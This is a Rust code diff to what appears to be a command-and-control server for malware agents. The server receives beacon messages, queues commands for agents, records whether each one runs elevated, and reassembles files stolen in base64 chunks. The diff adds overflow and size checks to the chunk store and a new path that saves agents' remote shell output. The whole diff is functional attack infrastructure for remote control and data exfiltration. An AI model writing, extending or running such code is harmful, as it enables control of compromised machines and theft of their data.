@@ -56,20 +56,44 @@ pub fn queue_command(queue: &CommandQueue, agent_id: &str, command: String) {
 }
 
 /// Store a file chunk at the given offset, accumulating with previous chunks
-pub fn store_download_chunk(store: &DownloadStore, agent_id: &str, file_path: &str, offset: u64, data: Vec<u8>) {
-    if let Ok(mut s) = store.lock() {
-        let agent_map = s.entry(agent_id.to_string()).or_insert_with(HashMap::new);
-        let file_data = agent_map.entry(file_path.to_string()).or_insert_with(Vec::new);
+/// Maximum file size: 1 GB (1_073_741_824 bytes)
+/// Returns: Ok(()) on success, Err(String) on validation failure
+pub fn store_download_chunk(store: &DownloadStore, agent_id: &str, file_path: &str, offset: u64, data: Vec<u8>) -> Result<(), String> {
+    const MAX_FILE_SIZE: u64 = 1_073_741_824; // 1 GB
 
-        // Expand buffer if needed
-        let end_offset = offset as usize + data.len();
-        if file_data.len() < end_offset {
-            file_data.resize(end_offset, 0);
-        }
-
-        // Copy chunk data at the correct offset
-        file_data[offset as usize..end_offset].copy_from_slice(&data);
+    // Validate input: check for empty data or zero offset edge cases
+    if data.is_empty() {
+        return Ok(());
     }
+
+    // Check for integer overflow: offset + data length must fit in u64
+    let data_len_u64 = data.len() as u64;
+    let end_offset = offset.checked_add(data_len_u64)
+        .ok_or_else(|| format!("Integer overflow: offset {} + data length {} would overflow u64", offset, data.len()))?;
+
+    // Enforce maximum file size limit (DoS protection)
+    if end_offset > MAX_FILE_SIZE {
+        return Err(format!("File size limit exceeded: {} bytes exceeds 1 GB maximum", end_offset));
+    }
+
+    // Attempt to acquire lock and store chunk
+    let mut s = store.lock()
+        .map_err(|e| format!("Failed to acquire lock (poisoned mutex): {}", e))?;
+
+    let agent_map = s.entry(agent_id.to_string()).or_insert_with(HashMap::new);
+    let file_data = agent_map.entry(file_path.to_string()).or_insert_with(Vec::new);
+
+    // Expand buffer if needed, with bounds checking
+    let end_offset_usize = end_offset as usize;
+    if file_data.len() < end_offset_usize {
+        file_data.resize(end_offset_usize, 0);
+    }
+
+    // Copy chunk data at the correct offset
+    let offset_usize = offset as usize;
+    file_data[offset_usize..end_offset_usize].copy_from_slice(&data);
+
+    Ok(())
 }
 
 /// Legacy function for compatibility (stores complete file)
@@ -175,7 +199,7 @@ fn handle_conn(stream: TcpStream, store: SessionStore, cmd_queue: CommandQueue, 
     let pid      = json_u64(&body_str, "pid") as u32;
     let elevated = json_u64(&body_str, "elevated") != 0;
 
-    // ── Parse file chunks from beacon msgs array ──
+    // ── Parse file chunks and shell output from beacon msgs array ──
     if let Some(msgs_start) = body_str.find("\"msgs\":[") {
         let msgs_content = &body_str[msgs_start + 8..];
         if let Some(msgs_end) = msgs_content.find(']') {
@@ -188,14 +212,37 @@ fn handle_conn(stream: TcpStream, store: SessionStore, cmd_queue: CommandQueue, 
                 if let Some(obj_end) = msgs_json[pos..].find('}') {
                     let obj = &msgs_json[pos..pos + obj_end + 1];
 
-                    // Check if this is a file chunk message
-                    if obj.contains("\"file\"") && obj.contains("\"chunk\"") {
+                    // Check if this is a shell output message (has "output" field instead of "chunk")
+                    if obj.contains("\"file\"") && obj.contains("\"output\"") && obj.contains("shell_output") {
+                        if let Some(output_b64) = json_str(obj, "output") {
+                            if let Some(decoded) = base64_decode(&output_b64) {
+                                // Store shell output as a file
+                                match store_download_chunk(&dl_store, &agent_id, "shell_output.txt", 0, decoded) {
+                                    Ok(()) => {
+                                        eprintln!("[*] Shell output received from {} ({} bytes)", agent_id, output_b64.len());
+                                    }
+                                    Err(e) => {
+                                        eprintln!("[!] Failed to store shell output for ({}): {}", agent_id, e);
+                                    }
+                                }
+                            }
+                        }
+                    }
+                    // Check if this is a regular file chunk message (has "chunk" field)
+                    else if obj.contains("\"file\"") && obj.contains("\"chunk\"") {
                         if let Some(file_field) = json_str(obj, "file") {
                             if let Some(chunk_b64) = json_str(obj, "chunk") {
                                 if let Some(decoded) = base64_decode(&chunk_b64) {
                                     // Extract offset if present (for multi-chunk reassembly)
                                     let offset = json_u64(obj, "offset");
-                                    store_download_chunk(&dl_store, &agent_id, &file_field, offset, decoded);
+                                    match store_download_chunk(&dl_store, &agent_id, &file_field, offset, decoded) {
+                                        Ok(()) => {
+                                            // Chunk stored successfully
+                                        }
+                                        Err(e) => {
+                                            eprintln!("[!] Failed to store chunk for {} ({}): {}", file_field, agent_id, e);
+                                        }
+                                    }
                                 }
                             }
                         }
